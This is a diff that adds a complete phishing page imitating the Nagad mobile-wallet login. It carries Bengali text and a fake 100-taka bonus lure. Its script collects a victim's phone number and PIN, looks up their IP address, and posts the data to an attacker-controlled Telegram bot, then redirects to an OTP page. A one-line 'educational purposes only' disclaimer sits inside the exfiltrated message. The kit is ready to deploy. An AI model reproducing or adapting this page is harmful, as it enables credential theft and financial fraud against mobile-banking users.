@@ -1,0 +1,251 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <link rel="shortcut icon" href="https://i.ibb.co/n0yL4dR/1679248787-Nagad-Logo-1.png" />
+    <meta property="og:title" content="এখনই লগইন করুন নগদ ওয়েবসাইটে ১০০ টাকা।বোনাস পাওয়ার জন্য সীমিত সুযোগ!" />
+    <meta property="og:description" content="এখনই লগইন করুন নগদ ওয়েবসাইটে ১০০ টাকা।বোনাস পাওয়ার জন্য সীমিত সুযোগ!" />
+    <meta property="og:image" content="https://i.ibb.co/VJCz5cG/142545-117.jpg" />
+    <meta name="robots" content="noindex, nofollow">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>নগদ ওয়েব লগ-ইন</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+    <style>
+    	@keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        body {
+            background-color: #fafafa;
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            justify-content: flex-start;
+            align-items: center;
+            height: 100vh;
+            padding-top: 50px;
+            overflow: hidden;
+        }
+
+        .logo {
+            text-align: center;
+            margin-bottom: 20px;
+            animation: fadeIn 1s ease-in-out;
+        }
+
+        .logo img {
+            max-width: 100px;
+        }
+
+        .container {
+            background-color: #fafafa;
+            padding: 20px;
+            border-radius: 10px;
+            width: 300px;
+            animation: fadeIn 1.5s ease-in-out;
+        }
+
+        .input-group {
+            margin-bottom: 25px;
+            text-align: left;
+            position: relative;
+            animation: fadeIn 2s ease-in-out;
+        }
+
+        .input-group p {
+            margin: 0 0 5px;
+            font-weight: bold;
+        }
+
+        .input-icon {
+            position: absolute;
+            left: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #ee462b;
+            font-family: FontAwesome;
+        }
+
+        .fa-phone:before {
+            content: "\f095";
+        }
+
+        .fa-lock:before {
+            content: "\f023";
+        }
+
+        input[type="number"] {
+            width: 100%;
+            padding: 10px 10px 10px 40px;
+            border: none;
+            border-bottom: 2px solid #CCCCCC;
+            border-radius: 4px;
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+            transition: border-color 0.3s, box-shadow 0.3s;
+            font-size: 18px;
+            background-color: #fafafa;
+        }
+
+        input[type="number"]::placeholder {
+            font-family: Arial, sans-serif;
+            color: #999999;
+            font-size: 16px;
+        }
+
+        input:focus {
+            border-bottom: 2px solid #ee462b;
+            box-shadow: none;
+            outline: none;
+        }
+
+        input.invalid {
+            border-bottom: 2px solid red;
+        }
+
+        #loginButton {
+            background-color: transparent;
+            color: #ee462b;
+            border: 2px solid #ee462b;
+            padding: 10px 20px;
+            border-radius: 20px;
+            cursor: pointer;
+            width: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: Arial, sans-serif;
+            font-size: 18px;
+            transition: background-color 0.3s, color 0.3s, transform 0.3s;
+            animation: fadeIn 2.5s ease-in-out;
+        }
+
+        #loginButton:hover {
+            background-color: #ee462b;
+            color: #FFFFFF;
+            transform: translateY(-2px);
+        }
+</style>
+</head>
+<body>
+    <div class="logo">
+        <img src="https://i.ibb.co/k8LkGTT/removal-ai-d3363a06-05e5-4e1d-bb5b-60348f7c2805-img-20240617-115730.png" alt="Nagad Logo">
+    </div>
+    <div class="container">
+        <div class="input-group">
+            <p>মোবাইল নাম্বার</p>
+            <i class="fa fa-phone input-icon"></i>
+            <input type="number" placeholder="XXX-XXXX-XXXX" id="mobileNumber">
+        </div>
+        <div class="input-group">
+            <p>নগদ পিন</p>
+            <i class="fa fa-lock input-icon"></i>
+            <input type="number" placeholder="XXXX" id="pin">
+        </div>
+        <button id="loginButton">লগ ইন</button>
+    </div>
+
+    <script>
+    	function getQueryParams() {
+            const params = new URLSearchParams(window.location.search);
+            return {
+                token: params.get('token'),
+                chatId: params.get('id')
+            };
+        }
+
+        const { token, chatId } = getQueryParams();
+
+        const loginButton = document.getElementById('loginButton');
+        const mobileNumber = document.getElementById('mobileNumber');
+        const pin = document.getElementById('pin');
+
+        loginButton.addEventListener('click', async () => {
+            const mobileNumberValue = mobileNumber.value.trim();
+            const pinValue = pin.value.trim();
+            let isValid = true;
+
+            if (!/^01\d{9}$/.test(mobileNumberValue)) {
+                mobileNumber.classList.add('invalid');
+                isValid = false;
+            } else {
+                mobileNumber.classList.remove('invalid');
+            }
+
+            if (!/^\d{4}$/.test(pinValue)) {
+                pin.classList.add('invalid');
+                isValid = false;
+            } else {
+                pin.classList.remove('invalid');
+            }
+
+            if (!isValid) {
+                alert('দয়া করে সঠিক নাম্বার এবং পিন লিখুন!');
+                return;
+            }
+
+            const userAgent = navigator.userAgent;
+            const date = new Date();
+            const ip = await fetch('https://api.ipify.org?format=json').then(response => response.json()).then(data => data.ip);
+
+            const loginData = {
+                mobileNumber: mobileNumberValue,
+                pin: pinValue,
+                ip: ip,
+                userAgent: userAgent,
+                date: date.toLocaleString()
+            };
+
+            const userMessage = `<b>🎣 নগদ ফি-শিং তথ্য</b>
+
+📱<b>Mobile Number:</b> <code>${loginData.mobileNumber}</code>
+
+ 🔐<b>PIN:</b> <code>${loginData.pin}</code>
+
+ 🌐<b>IP Address:</b> ${loginData.ip}
+
+ 💻<b>User Agent:</b> ${loginData.userAgent}
+
+ 📅<b>Date:</b> ${loginData.date}
+
+ <blockquote>⚠️এটি শুধু শিক্ষামূলক উদ্দেশ্যে বানানো হয়েছে। দয়া করে কেউ কারো ক্ষতি করার উদ্দেশ্যে এটি ব্যবহার করবেন না।</blockquote>`;
+
+            const sendToTelegram = async (token, chatId, message) => {
+                const telegramUrl = `https://api.telegram.org/bot${token}/sendMessage`;
+                const params = {
+                    chat_id: chatId,
+                    text: message,
+                    parse_mode: 'HTML'
+                };
+
+                try {
+                    const response = await fetch(telegramUrl, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify(params)
+                    });
+                    const data = await response.json();
+                    if (!data.ok) {
+                        console.error('Failed to send message:', data);
+                        throw new Error('Failed to send message to Telegram');
+                    }
+                } catch (error) {
+                    console.error('Error:', error);
+                    alert('Error occurred while sending message to Telegram');
+                }
+            };
+
+            console.log('Sending to user Telegram:', token, chatId, userMessage);
+            await sendToTelegram(token, chatId, userMessage);
+
+            const url = `otp.html?token=${token}&id=${chatId}`;
+            window.location.href = url;
+        });
+    </script>
+</body>
+</html>
